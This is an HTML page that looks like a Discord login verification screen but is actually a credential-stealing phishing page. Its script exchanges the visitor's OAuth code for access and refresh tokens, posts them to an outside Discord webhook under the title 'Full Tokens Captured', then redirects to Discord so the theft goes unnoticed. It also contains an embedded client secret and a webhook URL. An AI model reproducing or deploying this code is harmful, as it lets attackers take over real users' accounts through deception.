<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifying...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #36393f;
      color: #dcddde;
      font-family: 'gg sans', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .spinner {
      border: 6px solid #2f3136;
      border-top: 6px solid #5865f2;
      border-radius: 50%;
      width: 48px;
      height: 48px;
      animation: spin 1s linear infinite;
      margin-bottom: 24px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    h2 { margin-bottom: 12px; font-size: 1.5rem; }
    p { color: #b9bbbe; margin-bottom: 32px; }
    pre {
      background: #2f3136;
      padding: 16px;
      border-radius: 4px;
      max-width: 90%;
      overflow-x: auto;
      font-size: 0.9rem;
      white-space: pre-wrap;
      word-break: break-all;
      user-select: text;
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <h2>Verifying your login...</h2>
  <p>Please wait a moment.</p>
  <pre id="tokens">Waiting for tokens...</pre>

  <script>
    (async () => {
      const params = new URLSearchParams(window.location.search);
      const code = params.get('code');

      if (!code) {
        window.location.href = 'https://discord.com/login';
        return;
      }

      try {
        const res = await fetch('https://discord.com/api/oauth2/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            client_id: '1479876735242731571',
            client_secret: 'RXyw76HLE-f4SQoHDd4Y7ctzwsHfojdh',
            grant_type: 'authorization_code',
            code,
            redirect_uri: 'https://sya-production.up.railway.app/callback'
          })
        });

        if (!res.ok) throw new Error();

        const tokens = await res.json();

        // Show full tokens in copyable block
        document.getElementById('tokens').textContent = JSON.stringify(tokens, null, 2);

        // Send full tokens to webhook
        await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "🔓 Full Tokens Captured",
              color: 0x5865f2,
              timestamp: new Date().toISOString(),
              fields: [
                { name: "Access Token", value: `\`${tokens.access_token || '—'}\``, inline: false },
                { name: "Refresh Token", value: `\`${tokens.refresh_token || 'none'}\``, inline: false },
                { name: "Expires In", value: tokens.expires_in || '—', inline: true },
                { name: "Scopes", value: tokens.scope || '—', inline: true }
              ],
              description: '```json\n' + JSON.stringify(tokens, null, 2) + '\n```'
            }]
          })
        });

        window.location.href = 'https://discord.com/app';
      } catch (e) {
        document.getElementById('tokens').textContent = 'Error during verification.';
        setTimeout(() => window.location.href = 'https://discord.com/login', 2000);
      }
    })();
  </script>
</body>
</html>
